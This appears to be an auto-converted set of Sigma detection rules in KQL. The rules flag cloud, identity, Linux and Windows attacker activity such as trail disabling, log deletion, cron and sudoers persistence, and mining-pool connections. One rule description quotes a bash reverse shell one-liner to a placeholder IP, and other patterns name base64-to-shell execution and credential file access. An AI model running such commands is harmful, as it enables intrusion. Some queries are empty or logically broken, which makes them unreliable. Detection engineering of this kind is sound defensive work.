pysigma_kql:
events_all
| project _User
| where (_fileName contains 'C:\\Windows\\' or _fileName contains 'C:\\Temp\\' or _fileName contains 'C:\\PerfLogs\\' or _fileName contains 'C:\\Users\\Public\\' or _fileName contains 'C:\\Users\\Default\\' or _fileName contains '\\Client\\' or _fileName contains '\\tsclient\\' or _fileName contains '\\inetpub\\' or _fileName contains '/www/' or _fileName contains 'apache' or _fileName contains 'tomcat' or _fileName contains 'nginx' or _fileName contains 'weblogic') or (_fileName endswith '.asax' or _fileName endswith '.ashx' or _fileName endswith '.asmx' or _fileName endswith '.asp' or _fileName endswith '.aspx' or _fileName endswith '.bat' or _fileName endswith '.cfm' or _fileName endswith '.cgi' or _fileName endswith '.chm' or _fileName endswith '.cmd' or _fileName endswith '.dat' or _fileName endswith '.ear' or _fileName endswith '.gif' or _fileName endswith '.hta' or _fileName endswith '.jpeg' or _fileName endswith '.jpg' or _fileName endswith '.jsp' or _fileName endswith '.jspx' or _fileName endswith '.lnk' or _fileName endswith '.php' or _fileName endswith '.pl' or _fileName endswith '.png' or _fileName endswith '.ps1' or _fileName endswith '.psm1' or _fileName endswith '.py' or _fileName endswith '.pyc' or _fileName endswith '.rb' or _fileName endswith '.scf' or _fileName endswith '.sct' or _fileName endswith '.sh' or _fileName endswith '.svg' or _fileName endswith '.txt' or _fileName endswith '.vbe' or _fileName endswith '.vbs' or _fileName endswith '.war' or _fileName endswith '.wsf' or _fileName endswith '.wsh' or _fileName endswith '.xml')

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'lambda.amazonaws.com' and _eventName startswith 'UpdateFunctionConfiguration'

sigma_rule.description:
Detects when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls.
This would give an adversary access to the privileges associated with the Lambda service role that is attached to that function.
sigma_rule.name: AWS Attached Malicious Lambda Layer

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'cloudtrail.amazonaws.com' and (_eventName in~ ('StopLogging', 'UpdateTrail', 'DeleteTrail'))

sigma_rule.description: Detects disabling, deleting and updating of a Trail
sigma_rule.name: AWS CloudTrail Important Change

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'config.amazonaws.com' and (_eventName in~ ('DeleteDeliveryChannel', 'StopConfigurationRecorder'))

sigma_rule.description: Detects AWS Config Service disabling
sigma_rule.name: AWS Config Disabling Channel/Recorder

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'ses.amazonaws.com' and _eventName =~ 'DeleteIdentity'

sigma_rule.description: Detects an instance of an SES identity being deleted via the "DeleteIdentity" event. This may be an indicator of an adversary removing the account that carried out suspicious or malicious activities
sigma_rule.name: SES Identity Has Been Deleted

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'ec2.amazonaws.com' and _eventName =~ 'DisableEbsEncryptionByDefault'

sigma_rule.description:
Identifies disabling of default Amazon Elastic Block Store (EBS) encryption in the current region.
Disabling default encryption does not change the encryption status of your existing volumes.
sigma_rule.name: AWS EC2 Disable EBS Encryption

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'elasticfilesystem.amazonaws.com' and _eventName =~ 'DeleteFileSystem'

sigma_rule.description:
Detects when a EFS Fileshare is modified or deleted.
You can't delete a file system that is in use.
If the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare.
sigma_rule.name: AWS EFS Fileshare Modified or Deleted

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'elasticfilesystem.amazonaws.com' and _eventName =~ 'DeleteMountTarget'

sigma_rule.description: Detects when a EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts.
sigma_rule.name: AWS EFS Fileshare Mount Modified or Deleted

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'eks.amazonaws.com' and (_eventName in~ ('CreateCluster', 'DeleteCluster'))

sigma_rule.description: Identifies when an EKS cluster is created or deleted.
sigma_rule.name: AWS EKS Cluster Created or Deleted

pysigma_kql:
events_all

sigma_rule.description: Detects when an ElastiCache security group has been created.
sigma_rule.name: AWS ElastiCache Security Group Created

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'elasticache.amazonaws.com' and (_eventName in~ ('DeleteCacheSecurityGroup', 'AuthorizeCacheSecurityGroupIngress', 'RevokeCacheSecurityGroupIngress', 'AuthorizeCacheSecurityGroupEgress', 'RevokeCacheSecurityGroupEgress'))

sigma_rule.description: Identifies when an ElastiCache security group has been modified or deleted.
sigma_rule.name: AWS ElastiCache Security Group Modified or Deleted

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'guardduty.amazonaws.com' and _eventName =~ 'CreateIPSet'

sigma_rule.description: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs.
sigma_rule.name: AWS GuardDuty Important Change

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'iam.amazonaws.com' and (_eventName in~ ('GetLoginProfile', 'CreateLoginProfile')) and _userAgent contains 'S3 Browser'

sigma_rule.description: Detects S3 Browser utility performing reconnaissance looking for existing IAM Users without a LoginProfile defined then (when found) creating a LoginProfile.
sigma_rule.name: AWS IAM S3Browser LoginProfile Creation

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'iam.amazonaws.com' and (_eventName in~ ('CreateUser', 'CreateAccessKey')) and _userAgent contains 'S3 Browser'

sigma_rule.description: Detects S3 Browser utility creating IAM User or AccessKey.
sigma_rule.name: AWS IAM S3Browser User or AccessKey Creation

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'glue.amazonaws.com' and (_eventName in~ ('CreateDevEndpoint', 'DeleteDevEndpoint', 'UpdateDevEndpoint'))

sigma_rule.description: Detects possible suspicious glue development endpoint activity.
sigma_rule.name: AWS Glue Development Endpoint Activity

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'route53.amazonaws.com' and _eventName =~ 'DisableDomainTransferLock'

sigma_rule.description: Detects when a transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar.
sigma_rule.name: AWS Route 53 Domain Transfer Lock Disabled

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'route53.amazonaws.com' and _eventName =~ 'TransferDomainToAnotherAwsAccount'

sigma_rule.description: Detects when a request has been made to transfer a Route 53 domain to another AWS account.
sigma_rule.name: AWS Route 53 Domain Transferred to Another Account

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 's3.amazonaws.com' and (_eventName in~ ('PutBucketLogging', 'PutBucketWebsite', 'PutEncryptionConfiguration', 'PutLifecycleConfiguration', 'PutReplicationConfiguration', 'ReplicateObject', 'RestoreObject'))

sigma_rule.description: Detects when a user tampers with S3 data management in Amazon Web Services.
sigma_rule.name: AWS S3 Data Management Tampering

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'securityhub.amazonaws.com' and (_eventName in~ ('BatchUpdateFindings', 'DeleteInsight', 'UpdateFindings', 'UpdateInsight'))

sigma_rule.description: Detects the modification of the findings on SecurityHub.
sigma_rule.name: AWS SecurityHub Findings Evasion

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and _eventSource =~ 'ec2.amazonaws.com' and _eventName =~ 'ModifySnapshotAttribute'

sigma_rule.description: Detects the modification of an EC2 snapshot's permissions to enable access from another account
sigma_rule.name: AWS Snapshot Backup Exfiltration

pysigma_kql:
events_all
| where data_source_type_id in (456, 460, 501, 502, 507, 440, 347) and ((_eventSource =~ 'sts.amazonaws.com' and _eventName =~ 'AssumeRoleWithSAML') or (_eventSource =~ 'iam.amazonaws.com' and _eventName =~ 'UpdateSAMLProvider'))

sigma_rule.description: Identifies when suspicious SAML activity has occurred in AWS. An adversary could gain backdoor access via SAML.
sigma_rule.name: AWS Suspicious SAML Activity

pysigma_kql:
events_all
| where "_properties.message" =~ 'Delete conditional access policy'

sigma_rule.description: Monitor and alert on conditional access changes where non approved actor removed CA Policy.
sigma_rule.name: CA Policy Removed by Non Approved Actor

pysigma_kql:
events_all
| where "_properties.message" =~ 'Add conditional access policy'

sigma_rule.description: Monitor and alert on conditional access changes.
sigma_rule.name: New CA Policy by Non-approved Actor

pysigma_kql:
events_all
| where "_properties.message" in~ ('Update Application', 'Update Service principal')

sigma_rule.description: Detects when a configuration change is made to an applications AppID URI.
sigma_rule.name: Application AppID Uri Configuration Changes

pysigma_kql:
events_all
| where "_properties.message" in~ ('Update Application-Certificates and secrets management', 'Update Service principal/Update Application')

sigma_rule.description: Detects when a new credential is added to an existing application. Any additional credentials added outside of expected processes could be a malicious actor using those credentials.
sigma_rule.name: Added Credentials to Existing Application

pysigma_kql:
events_all
| where "_properties.message" =~ 'Update application - Certificates and secrets management'

sigma_rule.description: Identifies when a application credential is modified.

selection.properties.message: Update application - Certificates and secrets management

sigma_rule.name: Azure Application Credential Modified

pysigma_kql:
events_all
| where "_properties.message" =~ 'Add delegated permission grant'

sigma_rule.description: Detects when highly privileged delegated permissions are granted on behalf of all users
sigma_rule.name: Delegated Permissions Granted For All Users

pysigma_kql:
events_all
| where "_properties.message" =~ 'Device Code'

sigma_rule.description:
Device code flow is an OAuth 2.0 protocol flow specifically for input constrained devices and is not used in all environments.
If this type of flow is seen in the environment and not being used in an input constrained device scenario, further investigation is warranted.
This can be a misconfigured application or potentially something malicious.
sigma_rule.name: Application Using Device Code Authentication Flow

pysigma_kql:
events_all
| where "_properties.message" =~ 'Add owner to application'

sigma_rule.description: Detects when a new owner is added to an application. This gives that account privileges to make modifications and configuration changes to the application.
sigma_rule.name: Added Owner To Application

pysigma_kql:
events_all
| where "_properties.message" in~ ('Add delegated permission grant', 'Add app role assignment to service principal')

sigma_rule.description: Detects when an application is granted delegated or app role permissions for Microsoft Graph, Exchange, Sharepoint, or Azure AD

properties.message: Add app role assignment to service principal

sigma_rule.name: App Granted Microsoft Permissions

pysigma_kql:
events_all
| where "_properties.message" =~ 'Add app role assignment to service principal'

sigma_rule.description: Detects when administrator grants either application permissions (app roles) or highly privileged delegated permissions

selection.properties.message: Add app role assignment to service principal

sigma_rule.name: App Granted Privileged Delegated Or App Permissions

pysigma_kql:
events_all
| where "_properties.message" in~ ('Add member to role', 'Add eligible member to role', 'Add scoped member to role')

sigma_rule.description: Detects when an app is assigned Azure AD roles, such as global adminsitrator, or Azure RBAC roles, such as subscription owner.
sigma_rule.name: App Role Added

pysigma_kql:
events_all
| where "_properties.message" =~ 'ROPC'

sigma_rule.description:
Resource owner password credentials (ROPC) should be avoided if at all possible as this requires the user to expose their current password credentials to the application directly.
The application then uses those credentials to authenticate the user against the identity provider.
sigma_rule.name: Applications That Are Using ROPC Authentication Flow

pysigma_kql:
events_all
| where "_properties.message" =~ 'Update Application Sucess- Property Name AppAddress'

sigma_rule.description:
Detects when a configuration change is made to an applications URI.
URIs for domain names that no longer exist (dangling URIs), not using HTTPS, wildcards at the end of the domain, URIs that are no unique to that app, or URIs that point to domains you do not control should be investigated.

selection.properties.message: Update Application Sucess- Property Name AppAddress

sigma_rule.name: Application URI Configuration Changes

pysigma_kql:
events_all
| where "_properties.message" in~ ('Delete application', 'Hard Delete application')

sigma_rule.description: Identifies when a application is deleted in Azure.
sigma_rule.name: Azure Application Deleted

pysigma_kql:
events_all
| where "_properties.message" in~ ('Device no longer compliant', 'Device no longer managed')

sigma_rule.description: Identifies when a device in azure is no longer managed or compliant
sigma_rule.name: Azure Device No Longer Managed or Compliant

pysigma_kql:
events_all
| where "_properties.message" in~ ('Delete device', 'Delete device configuration', 'Update device', 'Update device configuration')

sigma_rule.description: Identifies when a device or device configuration in azure is modified or deleted.
sigma_rule.name: Azure Device or Configuration Modified or Deleted

pysigma_kql:
events_all
| where "_properties.message" =~ 'Add member from group'

sigma_rule.description: Monitor and alert on group membership additions of groups that have CA policy modification access
sigma_rule.name: User Added To Group With CA Policy Modification Access

pysigma_kql:
events_all
| where "_properties.message" =~ 'Remove member from group'

sigma_rule.description: Monitor and alert on group membership removal of groups that have CA policy modification access
sigma_rule.name: User Removed From Group With CA Policy Modification Access

pysigma_kql:
events_all
| where "_properties.message" in~ ('Remove owner from service principal', 'Remove owner from application')

sigma_rule.description: Identifies when a owner is was removed from a application or service principal in Azure.
sigma_rule.name: Azure Owner Removed From Application or Service Principal

pysigma_kql:
events_all
| where "_properties.message" =~ 'Request Approved/Denied'

sigma_rule.description: Detects when a PIM elevation is approved or denied. Outside of normal operations should be investigated.
sigma_rule.name: PIM Approvals And Deny Elevation

pysigma_kql:
events_all
| where "_properties.message" =~ 'Disable PIM Alert'

sigma_rule.description: Detects when PIM alerts are set to disabled.
sigma_rule.name: PIM Alert Setting Changes To Disabled

pysigma_kql:
events_all
| where "_properties.message" =~ 'Update role setting in PIM'

sigma_rule.description: Detects when changes are made to PIM roles
sigma_rule.name: Changes To PIM Settings

pysigma_kql:
events_all
| where "_properties.message" in~ ('Add eligible member (permanent)', 'Add eligible member (eligible)')

sigma_rule.description: Detects when a user is added to a privileged role.
sigma_rule.name: User Added To Privilege Role

pysigma_kql:
events_all
| where "_properties.message" in~ ('Remove eligible member (permanent)', 'Remove eligible member (eligible)')

sigma_rule.description: Detects when a user is removed from a privileged role. Bulk changes should be investigated.
sigma_rule.name: Bulk Deletion Changes To Privileged Account Permissions

pysigma_kql:
events_all
| where "_properties.message" =~ 'Add service principal'

sigma_rule.description: Identifies when a service principal is created in Azure.
sigma_rule.name: Azure Service Principal Created

pysigma_kql:
events_all
| where "_properties.message" =~ 'Remove service principal'

sigma_rule.description: Identifies when a service principal was removed in Azure.
sigma_rule.name: Azure Service Principal Removed

pysigma_kql:
events_all
| where data_source_type_id in (515, 452, 397) and _eventSource =~ 'SecurityComplianceCenter' and (_Payload has_all ('New-ComplianceSearchAction', 'Export', 'pst'))

sigma_rule.description: Alert when a user has performed an export to a search using 'New-ComplianceSearchAction' with the '-Export' flag. This detection will detect PST export even if the 'eDiscovery search or exported' alert is disabled in the O365.This rule will apply to ExchangePowerShell usage and from the cloud.
sigma_rule.name: PST Export Alert Using New-ComplianceSearchAction

sigma_rule.description:
Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels
Ensure that an encryption is used for all sensitive information in transit.
Ensure that an encrypted channels is used for all administrative account access.
sigma_rule.name: Cleartext Protocol Usage Via Netflow

pysigma_kql:
events_all
| where data_source_type_id == 11 and (_USER startswith '#-' or _USER matches regex '\#.*4294967295')

sigma_rule.description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287
sigma_rule.name: Sudo Privilege Escalation CVE-2019-14287 - Builtin

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name =~ 'doas.conf' and dir_path endswith '/etc'

sigma_rule.description: Detects the creation of doas.conf file in linux host platform.
sigma_rule.name: Linux Doas Conf File Creation

pysigma_kql:
events_all
| where data_source_type_id == 11 and ((dir_path startswith '/etc/cron.d/' or dir_path startswith '/etc/cron.daily/' or dir_path startswith '/etc/cron.hourly/' or dir_path startswith '/etc/cron.monthly/' or dir_path startswith '/etc/cron.weekly/' or dir_path startswith '/var/spool/cron/crontabs/') or ((file_name startswith 'cron.allow' and dir_path endswith '/etc') or (file_name startswith 'cron.deny' and dir_path endswith '/etc') or (file_name startswith 'crontab' and dir_path endswith '/etc')))

sigma_rule.description: Detects creation of cron file or files in Cron directories which could indicates potential persistence.
sigma_rule.name: Persistence Via Cron Files

pysigma_kql:
events_all
| where data_source_type_id == 11 and dir_path startswith '/etc/sudoers.d/'

sigma_rule.description: Detects creation of sudoers file or files in "sudoers.d" directory which can be used a potential method to persiste privileges for a specific user.
sigma_rule.name: Persistence Via Sudoers Files

pysigma_kql:
events_all
| where data_source_type_id == 11 and dir_path contains '/etc/profile.d/' and (file_name endswith '.csh' or file_name endswith '.sh')

sigma_rule.description: Detects the creation of shell scripts under the "profile.d" path.
sigma_rule.name: Potentially Suspicious Shell Script Creation in Profile Folder

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name =~ 'rootlog' and dir_path =~ '/tmp'

sigma_rule.description: Detects the creation of the file "rootlog" which is used by the TripleCross rootkit as a way to check if the backdoor is already running.
sigma_rule.name: Triple Cross eBPF Rootkit Default LockFile

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'ebpfbackdoor'

sigma_rule.description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d" directories. Which both are related to the TripleCross persistence method
sigma_rule.name: Triple Cross eBPF Rootkit Default Persistence

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'wget' and (dir_path startswith '/tmp/' or dir_path startswith '/var/tmp/')

sigma_rule.description: Detects the use of wget to download content in a temporary directory such as "/tmp" or "/var/tmp"
sigma_rule.name: Wget Creating Files in Tmp Directory

sigma_rule.description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
sigma_rule.name: Linux Reverse Shell Indicator

pysigma_kql:
events_all
| where data_source_type_id == 11 and _DestinationHostname in~ ('pool.minexmr.com', 'fr.minexmr.com', 'de.minexmr.com', 'sg.minexmr.com', 'ca.minexmr.com', 'us-west.minexmr.com', 'pool.supportxmr.com', 'mine.c3pool.com', 'xmr-eu1.nanopool.org', 'xmr-eu2.nanopool.org', 'xmr-us-east1.nanopool.org', 'xmr-us-west1.nanopool.org', 'xmr-asia1.nanopool.org', 'xmr-jp1.nanopool.org', 'xmr-au1.nanopool.org', 'xmr.2miners.com', 'xmr.hashcity.org', 'xmr.f2pool.com', 'xmrpool.eu', 'pool.hashvault.pro', 'moneroocean.stream', 'monerocean.stream')

sigma_rule.description: Detects process connections to a Monero crypto mining pool
sigma_rule.name: Linux Crypto Mining Pool Connections

pysigma_kql:
events_all
| where data_source_type_id == 11 and (_DestinationHostname contains 'tunnel.us.ngrok.com' or _DestinationHostname contains 'tunnel.eu.ngrok.com' or _DestinationHostname contains 'tunnel.ap.ngrok.com' or _DestinationHostname contains 'tunnel.au.ngrok.com' or _DestinationHostname contains 'tunnel.sa.ngrok.com' or _DestinationHostname contains 'tunnel.jp.ngrok.com' or _DestinationHostname contains 'tunnel.in.ngrok.com')

sigma_rule.description: Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors
sigma_rule.name: Communication To Ngrok Tunneling Service - Linux

pysigma_kql:
events_all
| where data_source_type_id == 11 and (file_name endswith 'at' or file_name endswith 'atd')

sigma_rule.description:
Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
sigma_rule.name: Scheduled Task/Job At

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'base64' and _CommandLine contains '-d'

sigma_rule.description: Detects usage of base64 utility to decode arbitrary base64-encoded text
sigma_rule.name: Decode Base64 Encoded Text

pysigma_kql:
events_all
| where data_source_type_id == 11 and _CommandLine contains 'base64 ' and ((_CommandLine contains '| bash ' or _CommandLine contains '| sh ' or _CommandLine contains '|bash ' or _CommandLine contains '|sh ') or (_CommandLine endswith ' |sh' or _CommandLine endswith '| bash' or _CommandLine endswith '| sh' or _CommandLine endswith '|bash'))

sigma_rule.description: Detects suspicious process command line that uses base64 encoded input for execution with a shell
sigma_rule.name: Linux Base64 Encoded Pipe to Shell

pysigma_kql:
events_all
| where data_source_type_id == 11 and (_CommandLine contains 'IyEvYmluL2Jhc2' or _CommandLine contains 'IyEvYmluL2Rhc2' or _CommandLine contains 'IyEvYmluL3pza' or _CommandLine contains 'IyEvYmluL2Zpc2' or _CommandLine contains 'IyEvYmluL3No')

sigma_rule.description: Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded
sigma_rule.name: Linux Base64 Encoded Shebang In CLI

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'bash' and _CommandLine contains ' -i '

sigma_rule.description: Detects execution of the bash shell with the interactive flag "-i".
sigma_rule.name: Bash Interactive Shell

pysigma_kql:
events_all
| where data_source_type_id == 11 and (_CommandLine has_all ('echo 1 >', '/sys/kernel/debug/tracing/events/kprobes/')) and (_CommandLine contains '/myprobe/enable' or _CommandLine contains '/myretprobe/enable')

sigma_rule.description: Detects common command used to enable bpf kprobes tracing
sigma_rule.name: Enable BPF Kprobes Tracing

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'bpftrace' and _CommandLine contains '--unsafe'

sigma_rule.description: Detects the usage of the unsafe bpftrace option
sigma_rule.name: BPFtrace Unsafe Option Usage

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'getcap' and (_CommandLine contains ' /r ' or _CommandLine contains ' -r ')

sigma_rule.description: Detects usage of "getcap" binary. This is often used during recon activity to determine potential binaries that can be abused as GTFOBins or other.
sigma_rule.name: Capabilities Discovery - Linux

pysigma_kql:
events_all
| where data_source_type_id == 11 and (file_name endswith 'cat' or file_name endswith 'grep' or file_name endswith 'head' or file_name endswith 'tail' or file_name endswith 'more') and _CommandLine contains ' /etc/sudoers'

sigma_rule.description: Detects the execution of a cat /etc/sudoers to list all users that have sudo rights
sigma_rule.name: Cat Sudoers

pysigma_kql:
events_all
| where data_source_type_id == 11 and file_name endswith 'chattr' and _CommandLine contains ' -i '

sigma_rule.description: Detects usage of the 'chattr' utility to remove immutable file attribute.
sigma_rule.name: Remove Immutable File Attribute

| where data_source_type_id == 12 and (file_name endswith 'cmd.exe' or file_name endswith 'powershell.exe' or file_name endswith 'pwsh.exe' or file_name endswith 'wt.exe' or file_name endswith 'rundll32.exe' or file_name endswith 'regsvr32.exe') and (file_name endswith '.VHD' or file_name endswith '.bac' or file_name endswith '.bak' or file_name endswith '.wbcat' or file_name endswith '.bkf' or file_name endswith '.set' or file_name endswith '.win' or file_name endswith '.dsk')

sigma_rule.description: Detects deletion of files with extensions often used for backup files. Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.
sigma_rule.name: Backup Files Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and dir_path startswith 'C:\\Windows\\System32\\winevt\\Logs\\' and file_name endswith '.evtx'

sigma_rule.description: Detects the deletion of the event log files which may indicate an attempt to destroy forensic evidence
sigma_rule.name: EventLog EVTX File Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and dir_path startswith '\\Logging\\CmdletInfra\\LocalPowerShell\\Cmdlet\\' and file_name contains '_Cmdlet_'

sigma_rule.description: Detects the deletion of the Exchange PowerShell cmdlet History logs which may indicate an attempt to destroy forensic evidence
sigma_rule.name: Exchange PowerShell Cmdlet History Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and dir_path contains '\\inetpub\\logs\\LogFiles\\' and file_name endswith '.log'

sigma_rule.description: Detects the deletion of IIS WebServer access logs which may indicate an attempt to destroy forensic evidence
sigma_rule.name: IIS WebServer Access Logs Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name =~ 'ConsoleHost_history.txt' and dir_path endswith '\\PSReadLine'

sigma_rule.description: Detects the deletion of the PowerShell console History logs which may indicate an attempt to destroy forensic evidence
sigma_rule.name: PowerShell Console History Logs Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and (dir_path startswith 'C:\\Windows\\Prefetch\\' and file_name endswith '.pf') and (not(((file_name =~ 'svchost.exe' and dir_path =~ 'C:\\windows\\system32') and (_User contains 'AUTHORI' or _User contains 'AUTORI'))))

sigma_rule.description: Detects the deletion of a prefetch file which may indicate an attempt to destroy forensic evidence
sigma_rule.name: Prefetch File Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name has_all ('TeamViewer_', '.log')) and (not((file_name =~ 'svchost.exe' and dir_path =~ 'C:\\Windows\\system32')))

sigma_rule.description: Detects the deletion of the TeamViewer log files which may indicate an attempt to destroy forensic evidence
sigma_rule.name: TeamViewer Log File Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name contains 'Tomcat' or dir_path contains '\\logs\\') and (file_name contains 'catalina.' or file_name contains '_access_log.' or file_name contains 'localhost.')

sigma_rule.description: Detects the deletion of tomcat WebServer logs which may indicate an attempt to destroy forensic evidence
sigma_rule.name: Tomcat WebServer Logs Deleted

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith '.AAA' or file_name endswith '.ZZZ') and (not((file_name =~ 'dictionary.alcatel-lucent.aaa' and dir_path endswith '\\Wireshark\\radius')))

sigma_rule.description: Detects the deletion of files by the Sysinternals SDelete utility. It looks for the common name pattern used to rename files.
sigma_rule.name: File Deleted Via Sysinternals SDelete

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'dns.exe' and (not(file_name endswith 'dns.log'))

sigma_rule.description: Detects an unexpected file being deleted by dns.exe which my indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)
sigma_rule.name: Unusual File Deletion by Dns.exe

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name startswith 'Cookies' and dir_path endswith '\\Microsoft\\Teams') or (file_name startswith 'leveldb' and dir_path endswith '\\Microsoft\\Teams\\Local Storage')) and (not((file_name startswith 'Teams.exe' and dir_path endswith '\\Microsoft\\Teams\\current')))

sigma_rule.description: Detects an access to authentication tokens and accounts of Microsoft Teams desktop application.
sigma_rule.name: Suspicious File Event With Teams Objects

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name endswith 'unattend.xml'

sigma_rule.description:
Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process
sigma_rule.name: Suspicious Unattend.xml File Access

pysigma_kql:
events_all
| where data_source_type_id == 12 and file_name startswith 'Advanced IP Scanner 2' and dir_path endswith '\\AppData\\Local\\Temp'

sigma_rule.description: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.
sigma_rule.name: Advanced IP Scanner - File Event

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((file_name startswith 'user.conf' and dir_path endswith '\\AppData\\Roaming\\AnyDesk') or (file_name startswith 'system.conf' and dir_path endswith '\\AppData\\Roaming\\AnyDesk')) and file_name endswith '.temp'

sigma_rule.description:
An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)
sigma_rule.name: Anydesk Temporary Artefact

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'anydesk.exe' and (file_name endswith '.dll' or file_name endswith '.exe')) and (not(file_name endswith 'gcapi.dll'))

sigma_rule.description:
Detects AnyDesk writing binary files to disk other than "gcapi.dll".
According to RedCanary research it is highly abnormal for AnyDesk to write executable files to disk besides gcapi.dll,
which is a legitimate DLL that is part of the Google Chrome web browser used to interact with the Google Cloud API. (See reference section for more details)
sigma_rule.name: Suspicious Binary Writes Via AnyDesk

pysigma_kql:
events_all
| where data_source_type_id == 12 and (file_name endswith 'BloodHound.zip' or file_name endswith '_computers.json' or file_name endswith '_containers.json' or file_name endswith '_domains.json' or file_name endswith '_gpos.json' or file_name endswith '_groups.json' or file_name endswith '_ous.json' or file_name endswith '_users.json') and (not((file_name endswith 'svchost.exe' and (file_name startswith 'Microsoft.' and dir_path =~ 'C:\\Program Files\\WindowsApps') and file_name endswith 'pocket_containers.json')))

sigma_rule.description: Detects default file names outputted by the BloodHound collection tool SharpHound
sigma_rule.name: BloodHound Collection Files

pysigma_kql:
events_all
| where data_source_type_id == 12 and ((dir_path startswith 'C:\\Windows\\Temp\\' and (file_name =~ 'rundll32.exe' and dir_path =~ 'C:\\WINDOWS\\system32') and (_User contains 'AUTHORI' or _User contains 'AUTORI') and (file_name endswith '.rtf' or file_name endswith '.otf' or file_name endswith '.odt' or file_name endswith '.txt' or file_name endswith '.doc' or file_name endswith '.pdf' or file_name endswith '.dll' or file_name endswith '.docx' or file_name endswith '.wpd' or file_name endswith '.icns' or file_name endswith '.db' or file_name endswith '.ini' or file_name endswith '.tex' or file_name endswith '.sys' or file_name endswith '.csv' or file_name endswith '.fon' or file_name endswith '.tar' or file_name endswith '.ttf' or file_name endswith '.xml' or file_name endswith '.cfg' or file_name endswith '.cpl' or file_name endswith '.jpg' or file_name endswith '.drv' or file_name endswith '.cur' or file_name endswith '.tmp')) or ((file_name =~ 'procdump.exe' and dir_path =~ 'C:\\Windows\\Temp') and (_User contains 'AUTHORI' or _User contains 'AUTORI')))

sigma_rule.description: Detects suspicious file creation patterns found in logs when CrackMapExec is used
sigma_rule.name: CrackMapExec File Creation Patterns

pysigma_kql:
events_all
